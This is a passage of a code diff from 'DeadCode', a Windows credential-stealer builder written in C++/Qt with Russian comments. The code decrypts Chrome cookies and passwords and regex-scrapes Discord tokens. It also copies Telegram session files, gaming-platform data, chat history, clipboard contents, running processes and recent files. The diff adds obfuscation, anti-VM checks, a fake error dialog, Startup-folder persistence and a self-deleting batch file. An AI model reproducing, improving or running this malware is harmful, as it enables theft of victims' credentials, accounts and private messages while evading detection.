+                                cookiesFile << "Host: " << host << "\nName: " << name << "\nValue: " << decryptedValue.toStdString() << "\n\n";
+                            }
+                        }
+                        sqlite3_finalize(stmt);
+                    }
+                    cookiesFile.close();
+                    emitLog("Куки Chrome извлечены: " + QString::fromStdString(cookiesDataPath));
+                    collectedFiles.push_back(cookiesDataPath);
+                    result += "Chrome Cookies: " + cookiesDataPath + "\n";
+                }
+                sqlite3_close(db);
+            }
+        }
+    }
+
+    if (config.passwords) {
+        std::string passwordsPath = chromePath + "\\Login Data";
+        if (std::filesystem::exists(passwordsPath)) {
+            std::string destPasswordsPath = browserDir + "\\chrome_logins.sqlite";
+            std::filesystem::copy_file(passwordsPath, destPasswordsPath, std::filesystem::copy_options::overwrite_existing);
+            emitLog("Файл паролей Chrome скопирован: " + QString::fromStdString(destPasswordsPath));
+
+            sqlite3* db;
+            if (sqlite3_open(destPasswordsPath.c_str(), &db) == SQLITE_OK) {
+                std::string passwordsDataPath = browserDir + "\\chrome_passwords.txt";
+                std::ofstream passwordsFile(passwordsDataPath);
+                if (passwordsFile.is_open()) {
+                    sqlite3_stmt* stmt;
+                    const char* query = "SELECT origin_url, username_value, password_value FROM logins";
+                    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
+                        while (sqlite3_step(stmt) == SQLITE_ROW) {
+                            std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
+                            std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
+                            QByteArray encryptedPassword(reinterpret_cast<const char*>(sqlite3_column_blob(stmt, 2)), sqlite3_column_bytes(stmt, 2));
+                            QByteArray decryptedPassword = decryptDPAPIData(encryptedPassword);
+                            if (!decryptedPassword.isEmpty()) {
+                                passwordsFile << "URL: " << url << "\nUsername: " << username << "\nPassword: " << decryptedPassword.toStdString() << "\n\n";
+                            }
+                        }
+                        sqlite3_finalize(stmt);
+                    }
+                    passwordsFile.close();
+                    emitLog("Пароли Chrome извлечены: " + QString::fromStdString(passwordsDataPath));
+                    collectedFiles.push_back(passwordsDataPath);
+                    result += "Chrome Passwords: " + passwordsDataPath + "\n";
+                }
+                sqlite3_close(db);
+            }
+        }
+    }
+
+    emitLog("Кража данных браузера завершена (старая версия)");
     return result;
 }
 
-// Кража токенов Discord
+// Класс для многопоточного извлечения токенов Discord
+class DiscordTokenStealer : public QRunnable {
+public:
+    DiscordTokenStealer(MainWindow* mw, const std::string& dir, const std::string& path)
+        : mw(mw), dir(dir), path(path) {}
+    void run() override {
+        std::string tokensPath = dir + "\\discord_tokens.txt";
+        std::ofstream outFile(tokensPath, std::ios::app);
+        if (!outFile.is_open()) {
+            mw->emitLog("Ошибка: Не удалось открыть файл для токенов Discord в потоке");
+            return;
+        }
+
+        std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
+        std::string tokenData;
+
+        if (std::filesystem::exists(path)) {
+            for (const auto& entry : std::filesystem::directory_iterator(path)) {
+                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
+                    std::ifstream file(entry.path(), std::ios::binary);
+                    if (!file.is_open()) continue;
+                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    file.close();
+
+                    std::smatch match;
+                    std::string::const_iterator searchStart(content.cbegin());
+                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
+                        std::string token = match[0].str();
+                        tokenData += "Token: " + token + "\n";
+                        searchStart = match.suffix().first;
+                    }
+                }
+            }
+        }
+
+        if (!tokenData.empty()) {
+            outFile << tokenData;
+        }
+        outFile.close();
+        if (!tokenData.empty()) {
+            mw->collectedFiles.push_back(tokensPath);
+            mw->emitLog("Токены Discord собраны из " + QString::fromStdString(path));
+        }
+    }
+private:
+    MainWindow* mw;
+    std::string dir;
+    std::string path;
+};
+
+// Реализация StealDiscordTokens с многопоточностью
 std::string MainWindow::StealDiscordTokens(const std::string& dir) {
     emitLog("Начало кражи токенов Discord...");
 
@@ -1791,60 +2100,35 @@ std::string MainWindow::StealDiscordTokens(const std::string& dir) {
     free(appDataPath);
 
     std::vector<std::string> discordPaths = {
-        appData + "\\discord\\Local Storage\\leveldb\\",
+        appData + decryptString(encryptedDiscordPath, 0),
         appData + "\\DiscordCanary\\Local Storage\\leveldb\\",
         appData + "\\DiscordPTB\\Local Storage\\leveldb\\"
     };
 
-    std::string tokensPath = discordDir + "\\discord_tokens.txt";
-    std::ofstream outFile(tokensPath);
-    if (!outFile.is_open()) {
-        emitLog("Ошибка: Не удалось создать файл для токенов Discord");
-        return "";
-    }
-
-    std::string tokenData;
-    std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
-    std::set<std::string> uniqueTokens;
+    QThreadPool pool;
+    pool.setMaxThreadCount(QThread::idealThreadCount());
 
     for (const auto& path : discordPaths) {
-        if (!std::filesystem::exists(path)) continue;
-
-        for (const auto& entry : std::filesystem::directory_iterator(path)) {
-            if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
-                std::ifstream file(entry.path(), std::ios::binary);
-                if (!file.is_open()) continue;
-                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
-                file.close();
-
-                std::smatch match;
-                std::string::const_iterator searchStart(content.cbegin());
-                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
-                    std::string token = match[0].str();
-                    if (uniqueTokens.insert(token).second) {
-                        tokenData += "Token: " + token + "\n";
-                    }
-                    searchStart = match.suffix().first;
-                }
-            }
-        }
+        pool.start(new DiscordTokenStealer(this, discordDir, path));
     }
 
-    if (!tokenData.empty()) {
-        outFile << tokenData;
-        outFile.close();
-        collectedFiles.push_back(tokensPath);
+    pool.waitForDone();
+
+    std::string tokensPath = discordDir + "\\discord_tokens.txt";
+    if (std::filesystem::exists(tokensPath) && std::filesystem::file_size(tokensPath) > 0) {
+        std::ifstream inFile(tokensPath);
+        std::string tokenData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+        inFile.close();
         emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
         return tokenData;
     } else {
-        outFile.close();
         std::filesystem::remove(tokensPath);
         emitLog("Токены Discord не найдены");
         return "";
     }
 }
 
-// Кража данных Telegram
+// Реализация StealTelegramData
 std::string MainWindow::StealTelegramData(const std::string& dir) {
     emitLog("Начало кражи данных Telegram...");
 
@@ -1861,7 +2145,7 @@ std::string MainWindow::StealTelegramData(const std::string& dir) {
     std::string appData(appDataPath);
     free(appDataPath);
 
-    std::string telegramPath = appData + "\\Telegram Desktop\\tdata";
+    std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
     if (!std::filesystem::exists(telegramPath)) {
         emitLog("Директория Telegram не найдена");
         return "";
@@ -1881,7 +2165,7 @@ std::string MainWindow::StealTelegramData(const std::string& dir) {
     return result;
 }
 
-// Кража данных Steam
+// Реализация StealSteamData
 std::string MainWindow::StealSteamData(const std::string& dir) {
     emitLog("Начало кражи данных Steam...");
 
@@ -1893,7 +2177,7 @@ std::string MainWindow::StealSteamData(const std::string& dir) {
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         char buffer[1024];
         DWORD size = sizeof(buffer);
-        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
             steamPath = std::string(buffer);
         }
         RegCloseKey(hKey);
@@ -1951,7 +2235,7 @@ std::string MainWindow::StealSteamData(const std::string& dir) {
     return result;
 }
 
-// Кража данных Epic Games
+// Реализация StealEpicGamesData
 std::string MainWindow::StealEpicGamesData(const std::string& dir) {
     emitLog("Начало кражи данных Epic Games...");
 
@@ -1991,7 +2275,7 @@ std::string MainWindow::StealEpicGamesData(const std::string& dir) {
     return result;
 }
 
-// Кража данных Roblox
+// Реализация StealRobloxData
 std::string MainWindow::StealRobloxData(const std::string& dir) {
     emitLog("Начало кражи данных Roblox...");
 
@@ -2029,7 +2313,7 @@ std::string MainWindow::StealRobloxData(const std::string& dir) {
     }
 }
 
-// Кража данных Battle.net
+// Реализация StealBattleNetData
 std::string MainWindow::StealBattleNetData(const std::string& dir) {
     emitLog("Начало кражи данных Battle.net...");
 
@@ -2069,7 +2353,7 @@ std::string MainWindow::StealBattleNetData(const std::string& dir) {
     return result;
 }
 
-// Кража данных Minecraft
+// Реализация StealMinecraftData
 std::string MainWindow::StealMinecraftData(const std::string& dir) {
     emitLog("Начало кражи данных Minecraft...");
 
@@ -2121,7 +2405,7 @@ std::string MainWindow::StealMinecraftData(const std::string& dir) {
     return result;
 }
 
-// Граббинг файлов
+// Реализация GrabFiles
 std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
     emitLog("Начало граббинга файлов...");
 
@@ -2166,7 +2450,159 @@ std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
     return grabbedFiles;
 }
 
-// Основной метод кражи и отправки данных
+// Реализация stealChatHistory
+std::string MainWindow::stealChatHistory(const std::string& dir) {
+    emitLog("Начало кражи истории чатов...");
+
+    std::string chatDir = dir + "\\ChatHistory";
+    std::filesystem::create_directories(chatDir);
+
+    std::string result;
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        free(appDataPath);
+        return "";
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
+
+    // Discord chat history (leveldb logs)
+    std::string discordPath = appData + decryptString(encryptedDiscordPath, 0);
+    if (std::filesystem::exists(discordPath)) {
+        std::string discordChatPath = chatDir + "\\discord_chat.txt";
+        std::ofstream discordChatFile(discordChatPath);
+        if (discordChatFile.is_open()) {
+            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
+                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
+                    std::ifstream file(entry.path(), std::ios::binary);
+                    if (file.is_open()) {
+                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                        file.close();
+                        std::regex messageRegex("\"content\":\"(.*?)\"");
+                        std::smatch match;
+                        std::string::const_iterator searchStart(content.cbegin());
+                        while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
+                            discordChatFile << "Discord Message: " << match[1].str() << "\n";
+                            searchStart = match.suffix().first;
+                        }
+                    }
+                }
+            }
+            discordChatFile.close();
+            if (std::filesystem::file_size(discordChatPath) > 0) {
+                collectedFiles.push_back(discordChatPath);
+                result += "Discord Chat History: " + discordChatPath + "\n";
+                emitLog("История чатов Discord сохранена: " + QString::fromStdString(discordChatPath));
+            } else {
+                std::filesystem::remove(discordChatPath);
+            }
+        }
+    }
+
+    // Telegram chat history (simplified, requires tdata parsing which is complex)
+    std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
+    if (std::filesystem::exists(telegramPath)) {
+        std::string telegramChatPath = chatDir + "\\telegram_chat.txt";
+        std::ofstream telegramChatFile(telegramChatPath);
+        if (telegramChatFile.is_open()) {
+            telegramChatFile << "Telegram chat history extraction requires advanced parsing of tdata files.\n";
+            telegramChatFile << "Files copied for manual analysis:\n";
+            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
+                std::string filename = entry.path().filename().string();
+                if (filename.find("key_data") == std::string::npos && filename.find("D877F783D5D3EF8C") != std::string::npos) {
+                    std::string destFilePath = chatDir + "\\" + filename;
+                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
+                    collectedFiles.push_back(destFilePath);
+                    telegramChatFile << destFilePath << "\n";
+                }
+            }
+            telegramChatFile.close();
+            if (std::filesystem::file_size(telegramChatPath) > 0) {
+                collectedFiles.push_back(telegramChatPath);
+                result += "Telegram Chat History (partial): " + telegramChatPath + "\n";
+                emitLog("История чатов Telegram (частичная) сохранена: " + QString::fromStdString(telegramChatPath));
+            } else {
+                std::filesystem::remove(telegramChatPath);
+            }
+        }
+    }
+
+    emitLog("Кража истории чатов завершена");
+    return result;
+}
+
+// Реализация collectSocialEngineeringData
+std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
+    emitLog("Сбор данных для социальной инженерии...");
+
+    std::string seDir = dir + "\\SocialEngineering";
+    std::filesystem::create_directories(seDir);
+
+    std::string sePath = seDir + "\\social_engineering.txt";
+    std::ofstream outFile(sePath);
+    if (!outFile.is_open()) {
+        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии");
+        return "";
+    }
+
+    std::string result;
+    // Собираем данные из буфера обмена
+    if (QGuiApplication::clipboard()->text().length() > 0) {
+        std::string clipboardData = QGuiApplication::clipboard()->text().toStdString();
+        outFile << "Clipboard Data: " << clipboardData << "\n";
+        result += "Clipboard: " + clipboardData + "\n";
+    }
+
+    // Собираем данные о запущенных процессах
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe32{};
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(snapshot, &pe32)) {
+            outFile << "Running Processes:\n";
+            do {
+                outFile << pe32.szExeFile << "\n";
+            } while (Process32Next(snapshot, &pe32));
+            result += "Running Processes collected\n";
+        }
+        CloseHandle(snapshot);
+    }
+
+    // Собираем данные о последних открытых файлах
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        outFile << "Recent Files:\n";
+        char valueName[256];
+        BYTE valueData[1024];
+        DWORD valueNameLen = sizeof(valueName);
+        DWORD valueDataLen = sizeof(valueData);
+        DWORD type;
+        for (DWORD i = 0; RegEnumValueA(hKey, i, valueName, &valueNameLen, nullptr, &type, valueData, &valueDataLen) == ERROR_SUCCESS; ++i) {
+            if (type == REG_SZ) {
+                outFile << valueName << ": " << reinterpret_cast<char*>(valueData) << "\n";
+                result += "Recent File: " + std::string(reinterpret_cast<char*>(valueData)) + "\n";
+            }
+            valueNameLen = sizeof(valueName);
+            valueDataLen = sizeof(valueData);
+        }
+        RegCloseKey(hKey);
+    }
+
+    outFile.close();
+    if (std::filesystem::file_size(sePath) > 0) {
+        collectedFiles.push_back(sePath);
+        emitLog("Данные социальной инженерии сохранены: " + QString::fromStdString(sePath));
+        return result;
+    } else {
+        std::filesystem::remove(sePath);
+        emitLog("Данные для социальной инженерии не найдены");
+        return "";
+    }
+}
+
+// Реализация StealAndSendData
 void MainWindow::StealAndSendData(const std::string& tempDir) {
     emitLog("Запуск процесса кражи и отправки данных...");
 
@@ -2176,21 +2612,28 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
 
     if (config.antiVM && isRunningInVM()) {
         emitLog("Обнаружена виртуальная машина. Прерывание выполнения.");
+        if (config.fakeError) {
+            MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Error", MB_ICONERROR | MB_OK);
+        }
         return;
     }
 
     if (config.fakeError) {
-        MessageBoxA(nullptr, "Application has encountered a critical error and needs to close.", "Error", MB_ICONERROR | MB_OK);
+        MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Error", MB_ICONERROR | MB_OK);
     }
 
-    std::filesystem::create_directories(tempDir);
-    emitLog("Временная директория создана: " + QString::fromStdString(tempDir));
+    try {
+        std::filesystem::create_directories(tempDir);
+        emitLog("Временная директория создана: " + QString::fromStdString(tempDir));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка создания временной директории: " + QString::fromStdString(e.what()));
+        return;
+    }
 
     if (config.systemInfo) {
         std::string sysInfo = collectSystemInfo(tempDir);
         if (!sysInfo.empty()) {
             collectedData += "System Info:\n" + sysInfo + "\n";
-            collectedFiles.push_back(sysInfo);
         }
     }
 
@@ -2257,15 +2700,15 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         }
     }
 
-    if (config.arizona) {
-        std::string arizonaData = StealArizonaData(tempDir);
+    if (config.arizonaRP) {
+        std::string arizonaData = StealArizonaRPData(tempDir);
         if (!arizonaData.empty()) {
             collectedData += "Arizona RP Data:\n" + arizonaData + "\n";
         }
     }
 
-    if (config.radmir) {
-        std::string radmirData = StealRadmirData(tempDir);
+    if (config.radmirRP) {
+        std::string radmirData = StealRadmirRPData(tempDir);
         if (!radmirData.empty()) {
             collectedData += "Radmir RP Data:\n" + radmirData + "\n";
         }
@@ -2277,6 +2720,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
             collectedData += "Grabbed Files:\n";
             for (const auto& file : grabbedFiles) {
                 collectedData += file + "\n";
+                collectedFiles.push_back(file);
             }
         }
     }
@@ -2314,7 +2758,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         if (!encryptedData.empty()) {
             emitLog("Данные зашифрованы, размер: " + QString::number(encryptedData.size()) + " байт");
 
-            std::string encryptedDataPath = tempDir + "\\encrypted_data.txt";
+            std::string encryptedDataPath = tempDir + "\\encrypted_data.bin";
             std::ofstream encryptedFile(encryptedDataPath, std::ios::binary);
             if (encryptedFile.is_open()) {
                 encryptedFile.write(encryptedData.data(), encryptedData.size());
@@ -2332,28 +2776,37 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
         emitLog("Нет данных для отправки");
     }
 
-    std::filesystem::remove_all(tempDir);
-    emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
+    try {
+        std::filesystem::remove_all(tempDir);
+        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
+    }
 
     if (config.selfDestruct) {
         emitLog("Запуск самоуничтожения...");
         char exePath[MAX_PATH];
-        GetModuleFileNameA(NULL, exePath, MAX_PATH);
-        std::string batchFile = "self_destruct.bat";
-        std::ofstream batFile(batchFile);
-        if (batFile.is_open()) {
-            batFile << "@echo off\n";
-            batFile << "timeout /t 2 /nobreak >nul\n";
-            batFile << "del \"" << exePath << "\"\n";
-            batFile << "del \"%~f0\"\n";
-            batFile.close();
-            system(("start /min " + batchFile).c_str());
+        if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+            std::string batchFile = "self_destruct.bat";
+            std::ofstream batFile(batchFile);
+            if (batFile.is_open()) {
+                batFile << "@echo off\n";
+                batFile << "timeout /t 2 /nobreak >nul\n";
+                batFile << "del \"" << exePath << "\"\n";
+                batFile << "del \"%~f0\"\n";
+                batFile.close();
+                system(("start /min " + batchFile).c_str());
+            } else {
+                emitLog("Ошибка: Не удалось создать файл самоуничтожения");
+            }
+        } else {
+            emitLog("Ошибка: Не удалось получить путь к исполняемому файлу для самоуничтожения");
         }
         QApplication::quit();
     }
 }
 
-// Запуск процесса кражи в отдельном потоке
+// Реализация startStealProcess
 void MainWindow::startStealProcess() {
     QString tempDir = QString::fromStdString("temp_" + generateRandomString(8));
     QThread* thread = new QThread(this);
@@ -2368,7 +2821,7 @@ void MainWindow::startStealProcess() {
     thread->start();
 }
 
-// Запуск GitHub Actions Workflow
+// Реализация triggerGitHubActions
 void MainWindow::triggerGitHubActions() {
     emitLog("Запуск GitHub Actions Workflow...");
 
@@ -2403,7 +2856,7 @@ void MainWindow::triggerGitHubActions() {
     });
 }
 
-// Проверка статуса сборки в GitHub Actions
+// Реализация checkBuildStatus
 void MainWindow::checkBuildStatus() {
     QString githubToken = githubTokenLineEdit->text();
     QString githubRepo = githubRepoLineEdit->text();
@@ -2457,7 +2910,7 @@ void MainWindow::checkBuildStatus() {
     });
 }
 
-// Загрузка артефактов из GitHub Actions
+// Реализация downloadArtifacts
 void MainWindow::downloadArtifacts() {
     QString githubToken = githubTokenLineEdit->text();
     QString githubRepo = githubRepoLineEdit->text();
@@ -2529,7 +2982,7 @@ void MainWindow::downloadArtifacts() {
     });
 }
 
-// Копирование иконки в директорию сборки
+// Реализация copyIconToBuild
 void MainWindow::copyIconToBuild() {
     if (config.iconPath.empty()) {
         emitLog("Иконка не указана, пропускаем копирование...");
@@ -2538,14 +2991,18 @@ void MainWindow::copyIconToBuild() {
 
     std::string destIconPath = "builds/icon.ico";
     std::filesystem::create_directories("builds");
-    if (std::filesystem::copy_file(config.iconPath, destIconPath, std::filesystem::copy_options::overwrite_existing)) {
-        emitLog("Иконка скопирована в директорию сборки: " + QString::fromStdString(destIconPath));
-    } else {
-        emitLog("Ошибка: Не удалось скопировать иконку в " + QString::fromStdString(destIconPath));
+    try {
+        if (std::filesystem::copy_file(config.iconPath, destIconPath, std::filesystem::copy_options::overwrite_existing)) {
+            emitLog("Иконка скопирована в директорию сборки: " + QString::fromStdString(destIconPath));
+        } else {
+            emitLog("Ошибка: Не удалось скопировать иконку в " + QString::fromStdString(destIconPath));
+        }
+    } catch (const std::exception& e) {
+        emitLog("Ошибка при копировании иконки: " + QString::fromStdString(e.what()));
     }
 }
 
-// Сборка исполняемого файла
+// Реализация buildExecutable
 void MainWindow::buildExecutable() {
     if (isBuilding) {
         emitLog("Сборка уже выполняется, пожалуйста, подождите...");
@@ -2559,7 +3016,7 @@ void MainWindow::buildExecutable() {
     generateEncryptionKeys();
     generatePolymorphicCode();
     generateJunkCode();
-    generateBuildKeyHeader();
+    generateBuildKeyHeader(generateRandomKey(32));
     copyIconToBuild();
 
     if (config.buildMethod == "GitHub Actions") {
@@ -2567,33 +3024,19 @@ void MainWindow::buildExecutable() {
         return;
     }
 
-    if (!std::filesystem::exists("main.cpp")) {
-        emitLog("Ошибка: Файл main.cpp не найден в текущей директории");
+    std::string polyCode = generatePolymorphicCode();
+    std::string junkCode = generateJunkCode();
+    if (!compileBuild(polyCode, junkCode)) {
+        emitLog("Ошибка: Не удалось скомпилировать билд");
         isBuilding = false;
         return;
     }
 
-    QString outputFile = QString::fromStdString(config.filename.empty() ? "DeadCode.exe" : config.filename);
-    QString command = "g++ -o \"" + outputFile + "\" main.cpp -lbcrypt -lshlwapi -liphlpapi -lpsapi -luser32 -lwininet -ladvapi32 -lws2_32 -lcrypt32 -lzip -lsqlite3 -lcurl -lssl -lcrypto";
-    command += config.iconPath.empty() ? " -mwindows -I. -L. -I./include -L./lib" : " -mwindows -I. -L. -I./include -L./lib -Wl,--subsystem,windows \"" + QString::fromStdString(config.iconPath) + "\"";
-
-    QProcess process;
-    process.start(command);
-    process.waitForFinished(-1);
-
-    if (process.exitCode() != 0) {
-        emitLog("Ошибка компиляции: " + QString::fromUtf8(process.readAllStandardError()));
-        isBuilding = false;
-        return;
-    }
-
-    emitLog("Исполняемый файл успешно скомпилирован: " + outputFile);
-
-    std::string exePath = outputFile.toStdString();
+    std::string exePath = "builds/" + (config.filename.empty() ? "DeadCode.exe" : config.filename);
     obfuscateExecutable(exePath);
     applyPolymorphicObfuscation(exePath);
 
-    emitLog("Сборка завершена: " + outputFile);
+    emitLog("Сборка завершена: " + QString::fromStdString(exePath));
     isBuilding = false;
 
     if (config.silent) {
@@ -2602,7 +3045,7 @@ void MainWindow::buildExecutable() {
     }
 }
 
-// Обработчик нажатия кнопки "Собрать"
+// Реализация on_buildButton_clicked
 void MainWindow::on_buildButton_clicked() {
     if (isBuilding) {
         emitLog("Сборка уже выполняется, пожалуйста, подождите...");
@@ -2611,7 +3054,7 @@ void MainWindow::on_buildButton_clicked() {
     buildExecutable();
 }
 
-// Обработчик нажатия кнопки выбора иконки
+// Реализация on_iconBrowseButton_clicked
 void MainWindow::on_iconBrowseButton_clicked() {
     QString iconPath = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
     if (!iconPath.isEmpty()) {
@@ -2621,13 +3064,13 @@ void MainWindow::on_iconBrowseButton_clicked() {
     }
 }
 
-// Обработчик нажатия кнопки очистки логов
+// Реализация on_clearLogsButton_clicked
 void MainWindow::on_clearLogsButton_clicked() {
     textEdit->clear();
     emitLog("Логи очищены");
 }
 
-// Сохранение конфигурации
+// Реализация saveConfig
 void MainWindow::saveConfig() {
     updateConfigFromUI();
     QString filePath = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.json)");
@@ -2641,6 +3084,8 @@ void MainWindow::saveConfig() {
     configObj["discordWebhook"] = QString::fromStdString(config.discordWebhook);
     configObj["filename"] = QString::fromStdString(config.filename);
     configObj["iconPath"] = QString::fromStdString(config.iconPath);
+    configObj["githubToken"] = QString::fromStdString(config.githubToken);
+    configObj["githubRepo"] = QString::fromStdString(config.githubRepo);
     configObj["discord"] = config.discord;
     configObj["steam"] = config.steam;
     configObj["steamMAFile"] = config.steamMAFile;
@@ -2648,8 +3093,8 @@ void MainWindow::saveConfig() {
     configObj["roblox"] = config.roblox;
     configObj["battlenet"] = config.battlenet;
     configObj["minecraft"] = config.minecraft;
-    configObj["arizona"] = config.arizona;
-    configObj["radmir"] = config.radmir;
+    configObj["arizonaRP"] = config.arizonaRP;
+    configObj["radmirRP"] = config.radmirRP;
     configObj["cookies"] = config.cookies;
     configObj["passwords"] = config.passwords;
     configObj["screenshot"] = config.screenshot;
@@ -2675,7 +3120,7 @@ void MainWindow::saveConfig() {
     }
 }
 
-// Загрузка конфигурации
+// Реализация loadConfig
 void MainWindow::loadConfig() {
     QString filePath = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.json)");
     if (filePath.isEmpty()) return;
@@ -2702,6 +3147,8 @@ void MainWindow::loadConfig() {
     discordWebhookLineEdit->setText(configObj["discordWebhook"].toString());
     fileNameLineEdit->setText(configObj["filename"].toString());
     iconPathLineEdit->setText(configObj["iconPath"].toString());
+    githubTokenLineEdit->setText(configObj["githubToken"].toString());
+    githubRepoLineEdit->setText(configObj["githubRepo"].toString());
     discordCheckBox->setChecked(configObj["discord"].toBool());
     steamCheckBox->setChecked(configObj["steam"].toBool());
     steamMAFileCheckBox->setChecked(configObj["steamMAFile"].toBool());
@@ -2709,8 +3156,8 @@ void MainWindow::loadConfig() {
     robloxCheckBox->setChecked(configObj["roblox"].toBool());
     battlenetCheckBox->setChecked(configObj["battlenet"].toBool());
     minecraftCheckBox->setChecked(configObj["minecraft"].toBool());
-    arizonaCheckBox->setChecked(configObj["arizona"].toBool());
-    radmirCheckBox->setChecked(configObj["radmir"].toBool());
+    arizonaRPCheckBox->setChecked(configObj["arizonaRP"].toBool());
+    radmirRPCheckBox->setChecked(configObj["radmirRP"].toBool());
     cookiesCheckBox->setChecked(configObj["cookies"].toBool());
     passwordsCheckBox->setChecked(configObj["passwords"].toBool());
     screenshotCheckBox->setChecked(configObj["screenshot"].toBool());
@@ -2730,7 +3177,7 @@ void MainWindow::loadConfig() {
     emitLog("Конфигурация загружена: " + filePath);
 }
 
-// Экспорт логов
+// Реализация exportLogs
 void MainWindow::exportLogs() {
     QString filePath = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
     if (filePath.isEmpty()) return;
@@ -2746,7 +3193,7 @@ void MainWindow::exportLogs() {
     }
 }
 
-// Обработчик ответа от сервера
+// Реализация replyFinished
 void MainWindow::replyFinished(QNetworkReply* reply) {
     if (reply->error() != QNetworkReply::NoError) {
         emitLog("Ошибка сети: " + reply->errorString());
@@ -2756,14 +3203,14 @@ void MainWindow::replyFinished(QNetworkReply* reply) {
     reply->deleteLater();
 }
 
-// Добавление лога в текстовое поле
+// Реализация appendLog
 void MainWindow::appendLog(const QString& message) {
     QMutexLocker locker(&logMutex);
     textEdit->append(message);
     textEdit->verticalScrollBar()->setValue(textEdit->verticalScrollBar()->maximum());
 }
 
-// Настройка персистентности
+// Настройка персистентности и автозагрузки
 void MainWindow::setupPersistence() {
     if (!config.autoStart && !config.persist) {
         emitLog("Персистентность и автозагрузка отключены, пропускаем...");
@@ -2772,48 +3219,74 @@ void MainWindow::setupPersistence() {
 
     emitLog("Настройка персистентности и автозагрузки...");
 
+    // Получение пути к текущему исполняемому файлу
     char exePath[MAX_PATH];
     if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
-        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу");
+        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу. Код ошибки: " + 
+                QString::number(GetLastError()));
         return;
     }
     std::string currentExePath = exePath;
 
+    // Получение пути к папке APPDATA
     char* appDataPath = nullptr;
     size_t len;
     if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        emitLog("Ошибка: Не удалось получить путь к APPDATA. Код ошибки: " + 
+                QString::number(errno));
         free(appDataPath);
         return;
     }
     std::string appData(appDataPath);
     free(appDataPath);
 
+    // Определение имени файла и пути для персистентности
     std::string filename = config.filename.empty() ? "DeadCode.exe" : config.filename;
     std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
     std::string persistPath = persistDir + "\\" + filename;
 
+    // Копирование файла для персистентности
     if (config.persist) {
-        std::filesystem::create_directories(persistDir);
-        if (std::filesystem::copy_file(currentExePath, persistPath, std::filesystem::copy_options::overwrite_existing)) {
-            emitLog("Файл скопирован для персистентности: " + QString::fromStdString(persistPath));
-        } else {
-            emitLog("Ошибка: Не удалось скопировать файл для персистентности в " + QString::fromStdString(persistPath));
+        try {
+            std::filesystem::create_directories(persistDir);
+            if (std::filesystem::copy_file(currentExePath, persistPath, 
+                                           std::filesystem::copy_options::overwrite_existing)) {
+                emitLog("Файл скопирован для персистентности: " + 
+                        QString::fromStdString(persistPath));
+            } else {
